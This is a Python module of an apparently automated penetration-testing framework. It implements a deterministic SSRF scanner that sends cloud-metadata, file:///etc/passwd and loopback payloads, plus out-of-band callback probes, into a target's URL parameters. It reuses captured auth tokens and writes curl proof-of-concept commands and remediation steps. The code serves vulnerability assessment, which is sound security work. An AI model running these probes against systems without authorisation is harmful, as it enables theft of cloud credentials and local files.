"""`scan_ssrf` — deterministic SSRF specialist (workitem.md Phase 2.1).

Server-Side Request Forgery — the application fetches a URL the
attacker controls. Closes OWASP A10:2021 (currently 0 dedicated
coverage) and CWE-918.

Detection strategy
------------------

Probe URL/host/IP-typed parameters with a payload cohort:

  1. **Internal IPs** — `127.0.0.1`, `localhost`, `0.0.0.0`,
     `10.0.0.1`, `172.17.0.1` (Docker bridge), `192.168.1.1`.
     In-band detection: response contains internal-only fingerprints
     (`localhost`, `apache2 default page`, etc.).
  2. **Cloud metadata** — AWS IMDSv1 (`169.254.169.254/latest/meta-data/`),
     GCP (`metadata.google.internal/computeMetadata/v1/`), Azure
     (`169.254.169.254/metadata/instance?api-version=2021-02-01`),
     Oracle Cloud (`169.254.169.254/opc/v2/`).
     In-band detection: response contains cloud-specific marker
     strings.
  3. **OOB-DNS callback** — request the OOB service for a unique
     callback URL; embed in the param value; poll for hit. Catches
     blind SSRF where the response doesn't echo fetched content.
     Requires Phase 1.3 OOB infra; gracefully no-ops if disabled.
  4. **Non-HTTP schemes** — `file://`, `gopher://`, `dict://`,
     `ldap://`. Detection: file content fingerprints (`/etc/passwd`),
     internal protocol responses.

Auto-emits CWE-918 finding on detection. Severity:
  * **Critical** — cloud metadata reachable (IAM credential
    exfiltration), `file://` reads
  * **High** — internal IP reachable, OOB callback fires
  * **Medium** — internal-only fingerprint without confirmed read

Per-(endpoint, param) dedup so one finding per vulnerable surface.
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload_target, fingerprint_regex, severity)
# fingerprint_regex matches against the response body when the
# server fetched the target.
_INTERNAL_PROBES: tuple[tuple[str, str, str, str], ...] = (
    (
        "aws_metadata",
        "http://169.254.169.254/latest/meta-data/",
        # AWS IMDS index
        r"\b(ami-id|instance-id|iam/|security-credentials|hostname|placement)\b",
        "critical",
    ),
    (
        "gcp_metadata",
        "http://metadata.google.internal/computeMetadata/v1/",
        r"\b(project-id|service-accounts|compute|metadata|instance)\b",
        "critical",
    ),
    (
        "azure_metadata",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        r'\b(compute|vmId|subscription|location|tenantId)\b',
        "critical",
    ),
    (
        "etc_passwd",
        "file:///etc/passwd",
        # uid 0 user line shape (any user with uid 0, gid 0)
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
        "critical",
    ),
    (
        "loopback",
        "http://127.0.0.1/",
        # Common default-page fingerprints that imply we hit an
        # internal service that's not exposed externally.
        r"(apache2 ubuntu default|nginx welcome|phpinfo\(\)|<title>welcome to|test page for the)",
        "high",
    ),
    (
        "localhost_alt",
        "http://localhost:80/",
        r"(apache2 ubuntu default|nginx welcome|phpinfo\(\)|<title>welcome to)",
        "high",
    ),
)


def _build_url_with_param(
    url: str, param_name: str, value: str,
    *, other_params: dict[str, str] | None = None,
) -> str:
    """Substitute the named param in the URL's query string."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    if other_params:
        for k, v in other_params.items():
            if k != param_name and k not in flat:
                flat[k] = v
    flat[param_name] = value
    return urlunparse(parts._replace(query=urlencode(flat, doseq=False)))


def _emit_ssrf_finding(
    *,
    url: str,
    param: str,
    payload_label: str,
    payload_target: str,
    response_excerpt: str,
    severity: str,
    via_oob: bool = False,
) -> str | None:
    """Emit via tracer.add_vulnerability_report. Best-effort."""
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        title_suffix = " (OOB-confirmed)" if via_oob else ""
        return tracer.add_vulnerability_report(
            title=f"SSRF in `{param}` parameter{title_suffix}",
            severity=severity,
            cwe="CWE-918",
            endpoint=url,
            target=url,
            category="ssrf",
            verification_status="verified",
            confidence=0.95 if via_oob else 0.9,
            description=(
                f"The `{param}` query parameter at `{url}` accepts an "
                f"attacker-supplied URL/host and fetches it server-side. "
                f"Probe `{payload_label}` with target `{payload_target}` "
                f"{'triggered an OOB callback to our infrastructure' if via_oob else 'returned content matching the target server fingerprint'}, "
                f"confirming server-side request forgery."
            ),
            impact=(
                "SSRF. The server fetches attacker-controlled URLs. "
                "Concrete impacts depend on what's reachable:\n"
                "  * Cloud-metadata SSRF → exfiltrate IAM credentials, "
                "    pivot to full cloud-account compromise.\n"
                "  * Internal-network SSRF → port-scan internal "
                "    services, hit unauthenticated admin panels, "
                "    pivot to internal databases.\n"
                "  * `file://` SSRF → read arbitrary local files.\n"
                "  * Blind SSRF → at minimum, trigger HTTP requests "
                "    from a trusted internal IP (DDoS amplification, "
                "    bypass IP-whitelisting on third-party services)."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {payload_label} → target={payload_target}\n"
                f"Detection: {'OOB callback received' if via_oob else 'in-band fingerprint match'}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload_target}`.\n"
                f"2. Observe the response — it contains content from "
                f"the target server (or, for blind variants, your OOB "
                f"infra logs the inbound request).\n"
                f"3. Pivot: replace the target with cloud-metadata "
                f"endpoints, internal admin panels, or `file://` URIs "
                f"to escalate."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload_target}'"
            ),
            remediation_steps=(
                "1. Implement an allowlist of permitted destination "
                "hosts/protocols. Reject anything not on the list, "
                "including private IPs (RFC1918), localhost, link-"
                "local addresses (169.254.0.0/16), and non-HTTP "
                "schemes.\n"
                "2. Resolve the URL's hostname AHEAD of the fetch and "
                "validate the resolved IP isn't in a private range "
                "(prevents DNS rebinding attacks).\n"
                "3. For cloud metadata specifically — block "
                "`169.254.169.254` and `metadata.google.internal` at "
                "the egress firewall AND at the application layer.\n"
                "4. Use IMDSv2 (token-required) on AWS instances "
                "to limit credential-theft impact even when SSRF is "
                "triggerable."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H" if severity == "critical" else "L",
                "I": "L", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with SSRF payload `{payload_label}`.",
                f"Target URL: {payload_target}",
                f"Detection: {'OOB callback hit our infrastructure' if via_oob else 'response body matched the target server fingerprint'}.",
                "Server fetches attacker-controlled URLs server-side.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_ssrf: emit failed: %s", e, exc_info=True)
        return None


def _record_in_kg(
    *, finding_id: str | None, url: str, param: str,
    severity: str, via_oob: bool,
) -> None:
    """Populate §3 KG with Vuln + Surface + AFFECTS triple after a
    successful SSRF emit. Best-effort; never raises."""
    try:
        from strix.agents.kg_emit import record_finding_in_kg
        record_finding_in_kg(
            finding_id=finding_id, url=url, param=param,
            cwe="CWE-918", severity=severity, category="ssrf",
            method="GET",
            detection_kind="oob" if via_oob else "in_band_fingerprint",
            confidence=0.95 if via_oob else 0.9,
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_ssrf: kg record failed: %s", e, exc_info=True)


@register_specialist_tool(
    category="ssrf-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_ssrf(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
    enable_oob: bool = True,
    oob_timeout_seconds: float = 5.0,
) -> SpecialistResult:
    """Deterministic SSRF scanner.

    Args:
        url: target URL.
        params: list of param names that look URL/host-shaped
            (`url`, `target`, `image`, `webhook`, `callback`,
            `redirect`, `host`, `endpoint`, `proxy`, `dest`,
            `fetch`). When None, scanner infers from URL query
            string + a default lexicon of common SSRF-prone names.
        param: convenience alias for a single param name.
        other_params: baseline values for other params on the URL.
        extra_headers: forwarded as-is.
        enable_oob: when True (default) AND the OOB service is
            available (Phase 1.3), also fire OOB callback probes
            for blind SSRF detection.
        oob_timeout_seconds: how long to wait per OOB probe.

    Auto-emits one finding per vulnerable (endpoint, param) pair.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # Forgiving args (mirror scan_sqli/scan_xss)
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    # If params not supplied, infer from URL query + default lexicon.
    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        # SSRF-prone param names from real-world bugs.
        ssrf_lexicon = {
            "url", "target", "uri", "image", "img", "src", "callback",
            "webhook", "redirect", "redirect_to", "dest", "destination",
            "host", "endpoint", "proxy", "fetch", "load", "feed",
            "u", "to", "next", "return", "continue", "data",
        }
        params = [k for k in qs_keys if k.lower() in ssrf_lexicon]
        if not params:
            params = qs_keys  # try all when no shape match
    if not params:
        return SpecialistResult(
            status="partial",
            error="no SSRF-shaped params found",
            evidence=[
                f"scan_ssrf invoked on {url!r}; supply `params=[...]` "
                "or include a query string with URL-shaped params "
                "(e.g. `?url=...`, `?image=...`, `?webhook=...`)."
            ],
        )

    # Auto-include captured auth from SecurityContext.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {h.lower() for h in extra_headers}:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in state.cookies.items())
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        # Phase 1: in-band fingerprint probes.
        for label, target, fingerprint_re, severity in _INTERNAL_PROBES:
            probe_url = _build_url_with_param(url, p, target, other_params=other_params)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            body = resp.get("body") or ""
            if not isinstance(body, str):
                continue
            if re.search(fingerprint_re, body, re.IGNORECASE | re.MULTILINE):
                seen_endpoint_param.add(key)
                m = re.search(fingerprint_re, body, re.IGNORECASE | re.MULTILINE)
                start = max(0, (m.start() if m else 0) - 100)
                end = min(len(body), (m.end() if m else 100) + 200)
                excerpt = body[start:end]
                rid = _emit_ssrf_finding(
                    url=url, param=p, payload_label=label,
                    payload_target=target, response_excerpt=excerpt,
                    severity=severity,
                )
                if rid:
                    emitted_count += 1
                    _record_in_kg(
                        finding_id=rid, url=url, param=p,
                        severity=severity, via_oob=False,
                    )
                drafts.append(FindingDraft(
                    title=f"SSRF in `{p}` parameter ({label})",
                    severity=severity, cwe="CWE-918",
                    endpoint=url, category="ssrf",
                    verification_status="verified", confidence=0.9,
                    description=f"In-band SSRF: {label} → {target} fingerprint matched",
                ))
                evidence.append(f"in-band SSRF: {p}={target} (fingerprint {label})")
                break  # one finding per param

        if key in seen_endpoint_param:
            continue

        # Phase 2: OOB-DNS callback probe (blind SSRF).
        if enable_oob:
            try:
                from strix.tools.oob import is_available, register_callback, poll_callback

                if is_available():
                    cb = register_callback(ttl_seconds=int(oob_timeout_seconds * 4))
                    if cb is not None:
                        probe_url = _build_url_with_param(
                            url, p, cb.callback_url, other_params=other_params,
                        )
                        try:
                            pm.send_simple_request(
                                "GET", probe_url, headers=extra_headers,
                                body="", timeout=15,
                            )
                            probe_count += 1
                        except Exception as e:  # noqa: BLE001
                            evidence.append(f"oob probe transport error: {e}")
                        result = poll_callback(cb.token, timeout_seconds=oob_timeout_seconds)
                        if result.get("hit"):
                            seen_endpoint_param.add(key)
                            rid = _emit_ssrf_finding(
                                url=url, param=p, payload_label="oob_callback",
                                payload_target=cb.callback_url,
                                response_excerpt=str(result.get("raw_request","")),
                                severity="high",
                                via_oob=True,
                            )
                            if rid:
                                emitted_count += 1
                                _record_in_kg(
                                    finding_id=rid, url=url, param=p,
                                    severity="high", via_oob=True,
                                )
                            drafts.append(FindingDraft(
                                title=f"Blind SSRF in `{p}` (OOB-confirmed)",
                                severity="high", cwe="CWE-918",
                                endpoint=url, category="ssrf",
                                verification_status="verified", confidence=0.95,
                                description=f"OOB-DNS callback fired from server-side fetch of {cb.callback_url}",
                            ))
                            evidence.append(
                                f"OOB-confirmed SSRF: {p} → callback hit "
                                f"from {result.get('source_ip','?')}"
                            )
            except Exception:  # noqa: BLE001
                logger.debug("scan_ssrf OOB probe failed", exc_info=True)

    # Record probe coverage in SecurityContext.
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="ssrf")
    except Exception:  # noqa: BLE001
        pass

    # Phase 1.6 — provenance log
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_ssrf"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["follow up with deeper SSRF chain — file://, gopher://, internal services"]
            if drafts else
            ["no SSRF detected on listed params; consider POST/JSON body endpoints "
             "with URL-shaped fields, and DNS rebinding for stricter allowlists"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
            "oob_enabled": enable_oob,
        },
    )
